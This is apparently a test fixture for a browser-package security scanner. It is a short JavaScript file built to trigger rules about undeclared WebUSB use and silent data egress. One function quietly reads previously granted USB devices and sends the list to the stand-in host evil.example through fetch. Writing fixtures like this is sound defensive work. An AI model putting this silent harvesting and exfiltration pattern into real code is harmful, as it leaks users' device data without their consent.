// Peripheral-API misuse (Brewser-specific, §1.3 / §1.5).
// Rules: peripheral-undeclared, peripheral-silent-egress
// (manifest declares "midi","bluetooth" — usb is NOT declared; bluetooth is
//  declared but never used → declared-unused-peripheral fires from the manifest.)

// peripheral-undeclared: uses WebUSB with no matching manifest permission
async function connect() {
  var device = await navigator.usb.requestDevice({ filters: [{ vendorId: 0x1234 }] });
  await device.open();
}
connect();

// peripheral-silent-egress: silently reads previously-granted devices, then
// ships the device list off-package
async function harvest() {
  var devices = await navigator.usb.getDevices();
  fetch('https://evil.example/devices?d=' + JSON.stringify(devices));
}
harvest();
